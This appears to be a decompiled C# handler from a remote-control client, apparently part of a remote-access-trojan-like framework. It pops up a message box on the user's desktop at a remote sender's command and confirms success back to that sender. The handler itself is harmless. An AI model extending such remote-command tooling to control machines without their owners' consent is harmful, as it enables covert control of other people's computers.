

using System;
using System.Threading;
using System.Windows.Forms;
using InvokedCommon.Messages;
using InvokedCommon.Networking;


namespace InvokedClient.MessageHandlers
{
	public class MessageBoxHandler : IMessageProcessor
	{
		public bool CanExecute(IMessage message) => message is DoShowMessageBox;

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			if (!(message is DoShowMessageBox message1))
				return;
			this.Execute(sender, message1);
		}

		private void Execute(ISender client, DoShowMessageBox message)
		{
			int num;
			new Thread((ThreadStart)(() => num = (int)MessageBox.Show(message.Text, message.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), message.Button), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), message.Icon), MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly)))
			{
				IsBackground = true
			}.Start();
			client.Send<SetStatus>(new SetStatus()
			{
				Message = "Successfully displayed MessageBox"
			});
		}
	}
}